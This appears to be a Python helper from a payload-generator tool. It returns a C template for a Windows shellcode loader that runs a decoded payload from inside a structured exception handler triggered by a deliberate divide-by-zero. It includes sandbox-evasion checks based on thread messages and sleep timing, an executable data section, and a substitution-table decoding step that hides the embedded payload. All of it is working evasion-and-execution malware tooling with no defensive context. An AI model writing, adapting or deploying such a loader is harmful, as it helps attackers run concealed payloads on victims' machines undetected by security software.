###"Technical principle: https://idiotc4t.com/code-and-dll-process-injection/seh-code-execute"
def get():
    c_code = '''
#include <stdio.h>
#include <windows.h>
#pragma comment(linker, "/section:.data,RWE")
int a = 1;
int b = 0;

int ExceptFilter()
{
	b = 1;
    PCHAR lpBuffer = <ALLOC>
	for (int i = 0; i < sizeof(offset_table)/sizeof(DWORD); i++)
	{
		lpBuffer[i] = random_dict_table[offset_table[i]];
	}
	
	((void(*NTAPI)(void)) & lpBuffer)();
	return EXCEPTION_CONTINUE_EXECUTION;
}

int main()
{
        MSG msg;
        DWORD tc;
        PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
        if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
                return 0;

        if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
                return 0;
        tc = GetTickCount();
        Sleep(650);

        if (((GetTickCount() - tc) / 300) != 2)
                return 0;
                
	_try
	{
		int c = a / b;
	}
	_except(ExceptFilter()) {
		
	};

	return 0;

}
    '''
    return c_code

